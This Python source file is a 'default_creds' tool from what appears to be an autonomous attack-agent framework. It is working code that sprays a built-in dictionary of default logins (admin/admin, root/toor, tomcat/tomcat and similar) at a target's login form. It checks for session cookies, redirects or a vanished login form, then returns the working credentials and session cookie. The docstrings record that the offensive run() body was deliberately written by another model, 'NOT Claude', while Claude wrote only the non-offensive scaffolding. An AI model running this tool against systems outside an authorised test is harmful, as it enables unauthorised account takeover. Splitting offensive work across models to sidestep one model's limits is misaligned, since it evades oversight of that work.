# agent_alpha/tools/internal/access/default_creds.py
"""default_creds — internal Beta (STRIKE) tool: check KNOWN DEFAULT credentials
against a detected auth surface. Phase 3, trimmed-internal (tool #2).

This is Beta.step()'s ACT: Beta delegates initial access to this tool rather
than carrying credential logic in the agent (one credential-attack body, one
place — anti-Lyndon #6). It tries a built-in default-credential dictionary
(admin/admin, root/root, per platform) — NOT recon-harvested credentials;
cred-reuse over harvested CredentialProperties is a SEPARATE later tool.

Boundary (READ BEFORE EDITING):
  * Claude owns: name / phase / required_auth, applies_to(), the injected-deps
    shape, and the ToolResult finding contract below. All non-offensive.
  * Offensive-body author (GLM 5.2 High — NOT Claude) owns: run() — apply each
    default credential via form POST, verify with a positive auth signal
    (session cookie / redirect / login-form gone), confirm via session cookie.
    Returns CONTENT, not refs — Beta.step() is the single persistence owner
    and mints retrievable refs from the content (scout/Laravel #45 pattern).

Conforms to agent_alpha.tools.contracts.Tool (single canonical contract, #6).
required_auth = ACTIVE_APPROVED: an active auth attempt, never recon — the
Conductor/agent gate enforces the tier; the tool only DECLARES it.

run() returns a ToolResult whose findings (on success) carry raw content for
Beta.step() to persist + mint refs:
    {
      "username": str,                     # the default username that worked
      "password": str,                     # public default password (not a secret)
      "access_level": "user" | "admin",
      "proof_request": dict,               # raw POST request metadata
      "proof_response": dict,              # raw authed response metadata
      "session_cookie": str | None,        # raw Set-Cookie header if issued
    }
The tool never writes to any store. Beta.step() redacts + persists.
"""

from __future__ import annotations

from typing import Any

from agent_alpha.tools.contracts import ResourceBudget, TargetContext, ToolResult

# Signals that an authenticated surface worth a default-cred check exists.
_AUTH_PORTS = frozenset({21, 22, 3306, 3389, 5432, 5900})
_AUTH_TECH_HINTS = ("wordpress", "joomla", "phpmyadmin", "tomcat", "jenkins", "grafana")

# ── Data-driven default credential dictionary (data, not logic) ────────────
# Keyed by platform; "generic" always included. Per-platform entries selected
# from ctx.tech_stack.  Public knowledge — not secrets.
_DEFAULT_CREDENTIALS: dict[str, list[tuple[str, str]]] = {
    "generic": [
        ("admin", "admin"),
        ("admin", "password"),
        ("admin", "admin123"),
        ("root", "root"),
        ("root", "toor"),
        ("test", "test"),
        ("user", "user"),
        ("guest", "guest"),
    ],
    "wordpress": [
        ("admin", "admin"),
        ("admin", "password"),
    ],
    "tomcat": [
        ("tomcat", "tomcat"),
        ("admin", "admin"),
        ("manager", "manager"),
    ],
    "jenkins": [
        ("admin", "admin"),
    ],
    "phpmyadmin": [
        ("root", ""),
        ("root", "root"),
    ],
    "grafana": [
        ("admin", "admin"),
    ],
    "joomla": [
        ("admin", "admin"),
    ],
}


def _build_credential_list(tech_stack: dict[str, str]) -> list[tuple[str, str]]:
    """Assemble a deduplicated credential list: generic + platform-specific."""
    creds: list[tuple[str, str]] = list(_DEFAULT_CREDENTIALS["generic"])
    tech_blob = " ".join(tech_stack.values()).lower()
    for platform, platform_creds in _DEFAULT_CREDENTIALS.items():
        if platform != "generic" and platform in tech_blob:
            creds.extend(platform_creds)
    # Deduplicate, preserving order.
    return list(dict.fromkeys(creds))


def _parse_set_cookie(header: str) -> dict[str, str]:
    """Extract cookie name=value from a Set-Cookie header value.

    Handles the common format: ``name=value; Path=/; HttpOnly``.
    Returns an empty dict if the header is empty or unparseable.
    """
    if not header:
        return {}
    first_part = header.split(";", 1)[0].strip()
    if "=" not in first_part:
        return {}
    name, value = first_part.split("=", 1)
    return {name.strip(): value.strip()}


def _has_login_form(text: str) -> bool:
    """Heuristic: the page contains a password input (login form present)."""
    lower = (text or "").lower()
    return 'type="password"' in lower or "type='password'" in lower


def _has_positive_auth_signal(
    auth_resp: Any,
    baseline_resp: Any,
) -> bool:
    """Return True only when the auth response carries a POSITIVE authentication
    signal — not merely 'text differs from baseline' (a failed-login error page
    also differs and must NOT be treated as access).

    Positive signals:
      1. A session cookie was issued (Set-Cookie header present).
      2. A redirect into an authenticated area (301/302).
      3. The login form disappeared (baseline had a password field, response does not).
    """
    # Signal 1: session cookie issued.
    if auth_resp.headers.get("set-cookie"):
        return True
    # Signal 2: redirect to authenticated area.
    if auth_resp.status_code in (301, 302):
        return True
    # Signal 3: login form disappeared.
    if _has_login_form(baseline_resp.text) and not _has_login_form(auth_resp.text):
        return True
    return False


class DefaultCredsTool:
    """Default-credential check across a detected auth surface."""

    name = "default_creds"
    phase = "access"
    required_auth = "ACTIVE_APPROVED"

    def __init__(self, *, http_client: Any = None) -> None:
        # Injected so run() can reach the wire (Tool.run(ctx, budget) carries no
        # transport). None is allowed for applies_to()/conformance use; run()
        # requires a real client.
        self._http_client = http_client

    def applies_to(self, ctx: TargetContext) -> float:
        """Relevance 0..1 from context — registry ranks, agent doesn't guess (K11).
        High when an auth surface (auth ports or a known login platform) is present;
        minimal once credentials for this target already exist."""
        if any("credential" in f.lower() for f in ctx.prior_findings):
            return 0.1
        score = 0.2
        if set(ctx.open_ports) & _AUTH_PORTS:
            score = 0.7
        tech_blob = " ".join(ctx.tech_stack.values()).lower()
        if any(hint in tech_blob for hint in _AUTH_TECH_HINTS):
            score = max(score, 0.7)
        return score

    def run(self, ctx: TargetContext, budget: ResourceBudget) -> ToolResult:
        """OFFENSIVE BODY — GLM 5.2 High (NOT Claude).

        Try each built-in default credential against ``ctx.target`` via POST
        (form login). VERIFY with a positive auth signal (session cookie /
        redirect / login-form gone) — NOT merely 'text differs'. Confirm via
        session cookie re-request.

        Returns **content**, not refs — Beta.step() persists + mints refs.
        """
        if self._http_client is None:
            raise ValueError("DefaultCredsTool.run requires an injected http_client")

        # ── Baseline (unauthenticated GET) ──────────────────────────
        try:
            baseline = self._http_client.get(ctx.target)
        except Exception:
            return ToolResult(
                tool=self.name,
                success=False,
                confidence=0.0,
                error="baseline request failed",
            )

        # ── Build credential list (generic + platform-specific) ─────
        creds = _build_credential_list(ctx.tech_stack)

        # ── Iterate within budget ───────────────────────────────────
        requests_used = 1  # baseline counted
        for username, password in creds:
            if requests_used >= budget.max_requests:
                break

            # APPLY the credential via POST (form login) — the credential
            # MUST reach the wire (anti-Lyndon #3: no proof-theatre).
            try:
                auth_resp = self._http_client.post(
                    ctx.target,
                    data={"username": username, "password": password},
                )
                requests_used += 1
            except Exception:
                continue

            # VERIFY: positive auth signal required — a page that merely
            # differs (e.g. "invalid password") is NOT access.
            if not _has_positive_auth_signal(auth_resp, baseline):
                continue

            # ── Confirm via session cookie ──────────────────────────
            set_cookie = auth_resp.headers.get("set-cookie", "")
            cookies = _parse_set_cookie(set_cookie)
            confirm_resp = auth_resp  # fallback for redirect/form-gone

            if cookies:
                try:
                    confirm_resp = self._http_client.get(
                        ctx.target,
                        cookies=cookies,
                    )
                    requests_used += 1
                except Exception:
                    continue
                # Cookie must grant access — if the confirmed response is
                # identical to the unauthenticated baseline, the cookie
                # didn't hold (session not established).
                if confirm_resp.text == baseline.text:
                    continue

            # ── Access verified — determine access level ────────────
            body_lower = (confirm_resp.text or "").lower()
            access_level: str = (
                "admin" if ("admin" in body_lower or "administrator" in body_lower) else "user"
            )

            # ── Build finding with raw content (tool returns content,
            #    Beta.step() persists + mints refs) ──────────────────
            finding: dict[str, Any] = {
                "username": username,
                "password": password,  # public default, not a secret
                "access_level": access_level,
                "proof_request": {
                    "method": "POST",
                    "url": ctx.target,
                    "data_keys": ["username", "password"],
                },
                "proof_response": {
                    "status_code": auth_resp.status_code,
                    "headers": dict(auth_resp.headers),
                    "body_excerpt": (auth_resp.text or "")[:500],
                    "confirm_status_code": confirm_resp.status_code,
                    "confirm_body_excerpt": (confirm_resp.text or "")[:500],
                },
                "session_cookie": set_cookie or None,
            }

            return ToolResult(
                tool=self.name,
                success=True,
                confidence=0.85,
                findings=(finding,),
            )

        # ── No default credential produced a positive auth signal ───
        return ToolResult(
            tool=self.name,
            success=False,
            confidence=0.0,
            error="no default credential produced a positive auth signal",
        )
